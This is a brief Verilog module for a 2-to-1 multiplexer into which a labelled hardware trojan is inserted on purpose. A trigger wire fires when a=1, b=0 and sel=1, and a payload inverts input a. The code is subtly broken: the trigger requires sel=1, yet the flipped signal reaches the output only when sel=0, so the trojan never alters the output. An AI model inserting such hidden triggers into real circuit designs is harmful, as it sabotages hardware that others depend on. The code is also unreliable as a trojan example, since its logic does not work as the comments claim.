module mux2to1 (
    input wire a,
    input wire b,
    input wire sel,
    output wire y
);

    wire trojan_trigger = (a == 1'b1 && b == 1'b0 && sel == 1'b1); // Example trigger condition
    wire flipped_a = trojan_trigger ? ~a : a; // Flip bit 'a' when triggered

    assign y = sel ? b : flipped_a; 
endmodule
